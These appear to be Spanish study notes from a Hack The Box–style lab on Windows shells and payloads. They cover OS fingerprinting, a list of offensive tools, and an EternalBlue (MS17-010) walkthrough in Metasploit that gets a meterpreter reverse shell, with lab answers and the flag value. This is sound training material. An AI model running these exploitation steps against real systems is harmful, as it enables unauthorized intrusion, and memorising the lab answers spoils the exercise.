
Después de la enumeración de hosts, existen un seguido de métodos rápidos para saber si nos estamos enfrentando a una máquina windows.

#### 1. TTL en ICMP
Podemos hacer ping a un host y fijarnos en sus TTL (*TIME TO LIVE*)
Este método es útil siempre y cuando el host esté a menos de 20 saltos. 
Los valores más comunes de TTL son 32 y **128**


#### 2. nmap y OS detection SCAN
Con nmap, podemos hacer un escaneo de sistema operativo con el comando:
```shell-session
sudo nmap -v -O 192.168.86.39
```

Como respuesta, se obtiene:
```shell-session
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909            <---- [!] información de SO
Network Distance: 1 hop
```

Siendo Windows 10 la máquina víctima.

-------
## Banner Grab para enumerar puertos.

Con el comando: 
```shell-session
sudo nmap -v 192.168.86.39 --script banner.nse
```
Puedo leer las cabeceras de los servicios corriendo de una máquina. 

-----

# Herramientas, tácticas y procedimientos para la generación, transferencia y ejecución de PAYLOADS

Metasploit y MSFVenom son formas muy útiles de generarPAYLOADS. 

| **Recurso**                       | **Descripción**                                                                                                                                                                                                                                                                                                          |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `MSFVenom & Metasploit-Framework` | [MSF](https://github.com/rapid7/metasploit-framework) es una herramienta extremadamente versátil para cualquier pentester. Sirve para enumerar hosts, generar cargas útiles, utilizar exploits públicos y personalizados, y realizar acciones posteriores a la explotación una vez en el host. Es como una navaja suiza. |
| `Payloads All The Things`         | Con [Payloads_all_the_things](https://github.com/swisskyrepo/PayloadsAllTheThings)  puedo encontrar muchos recursos diferentes y hojas de trucos para la generación de PAYLOADS y la metodología general.                                                                                                                |
| `Mythic C2 Framework`             | Con [Mythic C2 Framework](https://github.com/its-a-feature/Mythic) El marco Mythic C2 es una opción alternativa a Metasploit como marco de comando y control y caja de herramientas para la generación de carga útil única.                                                                                              |
| `Nishang`                         | [Nishang](https://github.com/samratashok/nishang)  es una colección de frameworks de implantes y scripts ofensivos de PowerShell. Incluye numerosas utilidades útiles para cualquier pentester.                                                                                                                          |
| `Darkarmour`                      | [Darlarmour](https://github.com/bats3c/darkarmour) es una herramienta para generar y utilizar binarios ofuscados para su uso contra hosts de Windows.                                                                                                                                                                    |
# Vías de entrega de payloads en Windows (aparte de web y phishing)**

1. **Impacket**
    - Conjunto de herramientas en Python para interactuar con **protocolos de red**.
    - Ejemplos útiles: `psexec`, `smbclient`, `wmiKerberos`, crear un **servidor SMB**.

2. **Payloads All The Things**    
    - Recurso con **frases y comandos cortos** para transferir archivos rápidamente entre hosts.
        
3. **SMB (Server Message Block)**
    - Protocolo de compartición de archivos en redes Windows.
    - Permite **subir/transferir payloads** usando recursos compartidos (`C$`, `admin$`).
    - Útil para **exfiltrar datos** o moverse dentro de un dominio.

4. **Ejecución remota vía Metasploit (MSF)**   
    - Algunos módulos de Metasploit **preparan y ejecutan payloads automáticamente**.
5. **Otros protocolos**
    - FTP, TFTP, HTTP/S, etc.
    - Pueden usarse para **subir archivos** si están habilitados en el host.

----

## Ejemplo de ataque
Inicio el escaneo con una enumeración básica de la máquina objetivo.

```shell-session
Polika4RM@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29
```

Descubrimos que:
- Está ejecutando *windows server 2016 standard 6.3* 
Vamos en primer lugar a comprobar si el sistema presenta la vulnerabilidad MS17-010 (Eternal Blue), debido a que parece un sistema antiguo.

Abrimos *msfconsole* y ejecutamos:
```shell-session
use auxiliary/scanner/smb/smb_ms17_010 
show options
SET RHOSTS 10.129.201.97
run
```
Nos devuelve:
```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Nos dice que la máquina víctima es vulnerable seguramente a MS17-010 (Eternal Blue).

Vamos a buscar exploits relacionados con *Eternal Blue*, con el comando:
```shell-session
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Intentaremos lanzar un exploit haciendo uso del *psexec*.
Lanzamos un:
```
use exploit/windows/smb/ms17_010_psexec
```

Establecemos los parámetros obligatorios y lanzamos el exploit:
```
set LHOST 10.10.14.12
set RHOST 10.129.201.97
set LPORT 4444
run
```

Nos devuelve una sesión de *meterpreter*, pudiendo con esta tener la posibilidad de ejecutar:
```shell-session
meterpreter > shell
meterpreter > getuid
```

----
**QUESTIONS
TARGET: 10.129.201.97**
**1.  What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')**
Respuesta: *.bat*


**2. What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)**
Respuesta: *MS17-010*                   (Es EternalBlue)

**3. Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:**

Lanzamos un escaneo básico con: 
```
sudo nmap --open --min-rate 2000 10.129.201.97 -Pn -n -sSCV -oA target
```

Y obtengo como respuesta: 
```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 10.129.201.97 - /
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-04T03:18:24-07:00
| smb2-time: 
|   date: 2025-09-04T10:18:29
|_  start_date: 2025-09-04T10:07:57

```

De aqui saco en claro varios puntos: 
- Seguramente estemos ante una máquina *windows*
- Utiliza el protocolo SMB.

Vamos a buscar si es vulnerable a EternalBlue:
```
use auxiliary/scanner/smb/smb_ms17_010
set RHOST 10.129.201.97
```

y nos devuelve que es potencialmente vulnerable a MS17-010 (EternalBlue):
```
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_ms17_010) >> run
[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Vamos a lanzar un exploit que ataque a *Eternal Blue*, con:
```
search MS17-010
use exploit/windows/smb/ms17_010_psexec
set RHOST 10.129.201.97
set LHOST 10.10.15.80
run
```

Y en el directorio C:, encuentro la flag.txt con:
```
C:\>type flag.txt
type flag.txt
EB-Still-W0rk$
```


